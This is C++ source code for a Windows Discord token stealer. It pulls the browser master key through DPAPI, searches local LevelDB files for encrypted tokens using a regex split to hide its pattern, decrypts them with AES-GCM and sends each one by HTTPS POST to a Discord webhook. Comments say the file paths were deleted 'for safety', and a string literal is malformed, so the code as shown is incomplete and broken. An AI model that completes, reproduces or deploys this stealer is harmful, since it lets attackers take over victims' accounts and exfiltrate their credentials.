#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <vector>
#include <string>
#include <filesystem>
#include <fstream>
#include <regex>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "wininet.lib")

namespace fs = std::filesystem;

void FastExfiltrate(std::string token) {
    std::string jsonPayload = "{\"embeds\": [{\"title\": \"", \"description\": \"Token: " + token + "\", \"color\": 3066993}]}";
    HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hSession) {
        HINTERNET hConnect = InternetConnectA(hSession, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            const char* path = "";
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
            if (hRequest) {
                const char* szHeaders = "Content-Type: application/json";
                (void)HttpSendRequestA(hRequest, szHeaders, (DWORD)strlen(szHeaders), (LPVOID)jsonPayload.c_str(), (DWORD)jsonPayload.length());
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hSession);
    }
}


std::string DecryptToken(std::vector<BYTE> ciphertext, std::vector<BYTE> masterKey) {
    if (ciphertext.size() < 15) return "";
    std::vector<BYTE> iv(ciphertext.begin() + 3, ciphertext.begin() + 15);
    std::vector<BYTE> payload(ciphertext.begin() + 15, ciphertext.end());
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbPlainText = 0;
    std::string result = "";

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) == 0) {
        if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) == 0) {
            if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PBYTE)masterKey.data(), (DWORD)masterKey.size(), 0) == 0) {
                BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
                BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
                authInfo.pbNonce = iv.data(); authInfo.cbNonce = (DWORD)iv.size();
                authInfo.pbTag = payload.data() + payload.size() - 16; authInfo.cbTag = 16;
                DWORD ciphertextLen = (DWORD)payload.size() - 16;
                std::vector<BYTE> plainText(ciphertextLen);
                if (BCryptDecrypt(hKey, payload.data(), ciphertextLen, &authInfo, NULL, 0, plainText.data(), (DWORD)plainText.size(), &cbPlainText, 0) == 0) {
                    result = std::string(plainText.begin(), plainText.end());
                }
                BCryptDestroyKey(hKey);
            }
        }
        BCryptCloseAlgorithmProvider(hAlg, 0);
    }
    return result;
}


std::vector<BYTE> GetKey() {
    char* appdataPtr = nullptr; size_t sz = 0;
    if (_dupenv_s(&appdataPtr, &sz, "APPDATA") != 0 || appdataPtr == nullptr) return {};
    std::string path(appdataPtr); free(appdataPtr);


    //THIS LINE IS REMOVED FOR SAFETY
    std::ifstream f(localStatePath);
    if (!f.is_open()) return {};

    std::string s((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
    size_t pos = s.find("\"encrypted_key\":\"") + 17;
    if (pos == std::string::npos) return {};
    std::string encodedKey = s.substr(pos, s.find("\"", pos) - pos);

    DWORD decodedLen = 0;
    CryptStringToBinaryA(encodedKey.c_str(), 0, CRYPT_STRING_BASE64, NULL, &decodedLen, NULL, NULL);
    std::vector<BYTE> decoded(decodedLen);
    CryptStringToBinaryA(encodedKey.c_str(), 0, CRYPT_STRING_BASE64, decoded.data(), &decodedLen, NULL, NULL);

    DATA_BLOB input, output;
    input.pbData = decoded.data() + 5; input.cbData = (DWORD)decoded.size() - 5;
    std::vector<BYTE> key;
    if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
        key.assign(output.pbData, output.pbData + output.cbData);
        LocalFree(output.pbData);
    }
    return key;
}

int APIENTRY WinMain(_In_ HINSTANCE h, _In_opt_ HINSTANCE hp, _In_ LPSTR l, _In_ int n) {
    (void)h; (void)hp; (void)l; (void)n;
    Sleep(5000);

    std::vector<BYTE> masterKey = GetKey();
    if (masterKey.empty()) return 0;

    char* appdataPtr = nullptr; size_t sz = 0;
    _dupenv_s(&appdataPtr, &sz, "APPDATA");
    if (!appdataPtr) return 0;
    //THIS PART IS DELETED FOR SAFETY MEASURES (DB PATH)
    free(appdataPtr);

    if (fs::exists(dbPath)) {
        std::string r1 = "dQw4"; std::string r2 = "w9Wg"; std::string r3 = "XcQ:[^\"]*";
        std::regex tokenRegex(r1 + r2 + r3);

        for (const auto& entry : fs::directory_iterator(dbPath)) {
            if (entry.path().extension() == ".ldb" || entry.path().extension() == ".log") {
                std::ifstream file(entry.path(), std::ios::binary);
                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                std::smatch match;
                std::string::const_iterator searchStart(content.cbegin());
                while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                    std::string raw = match[0].str().substr(12);
                    DWORD bLen = 0;
                    if (CryptStringToBinaryA(raw.c_str(), 0, CRYPT_STRING_BASE64, NULL, &bLen, NULL, NULL)) {
                        std::vector<BYTE> binary(bLen);
                        if (CryptStringToBinaryA(raw.c_str(), 0, CRYPT_STRING_BASE64, binary.data(), &bLen, NULL, NULL)) {
                            std::string dec = DecryptToken(binary, masterKey);
                            if (!dec.empty()) FastExfiltrate(dec);
                        }
                    }
                    searchStart = match.suffix().first;
                }
            }
        }
    }
    return 0;
}
